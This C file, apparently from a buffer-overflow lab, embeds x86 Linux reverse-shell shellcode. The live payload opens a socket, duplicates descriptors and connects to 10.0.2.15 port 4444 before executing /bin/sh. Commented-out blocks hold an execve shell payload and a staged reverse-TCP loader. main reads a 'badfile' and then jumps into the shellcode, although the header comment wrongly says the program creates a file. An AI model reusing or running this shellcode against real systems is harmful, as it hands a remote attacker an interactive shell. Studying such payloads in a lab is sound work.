/* call_shellcode.c  */

/*A program that creates a file containing code for launching shell*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* const char shell[] = "\x31\xc0" /\* Line 1:  xorl    %eax,%eax *\/ */
/*                     "\x50"     /\* Line 2:  pushl   %eax *\/ */
/*                     "\x68" */
/*                     "//sh" /\* Line 3:  pushl   $0x68732f2f            *\/ */
/*                     "\x68" */
/*                     "/bin"     /\* Line 4:  pushl   $0x6e69622f *\/ */
/*                     "\x89\xe3" /\* Line 5:  movl    %esp,%ebx *\/ */
/*                     "\x50"     /\* Line 6:  pushl   %eax *\/ */
/*                     "\x53"     /\* Line 7:  pushl   %ebx *\/ */
/*                     "\x89\xe1" /\* Line 8:  movl    %esp,%ecx *\/ */
/*                     "\x99"     /\* Line 9:  cdq *\/ */
/*                     "\xb0\x0b" /\* Line 10: movb    $0x0b,%al *\/ */
/*                     "\xcd\x80" /\* Line 11: int     $0x80 *\/ */
/*     ; */

/* const char shell[] = */
/*     "\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66" */
/*     "\x89\xe1\xcd\x80\x97\x5b\x68\x0a\x00\x02\x0f\x68\x02\x00" */
/*     "\x11\x5c\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd" */
/*     "\x80\x85\xc0\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58" */
/*     "\x6a\x00\x6a\x05\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd" */
/*     "\xeb\x27\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c" */
/*     "\xc1\xe3\x0c\xb0\x7d\xcd\x80\x85\xc0\x78\x10\x5b\x89\xe1" */
/*     "\x99\xb2\x24\xb0\x03\xcd\x80\x85\xc0\x78\x02\xff\xe1\xb8" */
/*     "\x01\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80"; */

unsigned char shell[] = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
                      "\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x00\x02"
                      "\x0f\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3"
                      "\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
                      "\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\xcd\x80";

int main(int argc, char **argv) {
  /* char buf[sizeof(shell)]; */
  /* strcpy(buf, shell); */

  unsigned char buff[517];

  FILE *badfile = fopen("badfile", "r");
  fread(buff, sizeof(char), 517, badfile);

  /* memset(&buf, 0x90, sizeof(shell)); */
  ((void (*)())shell)();
}
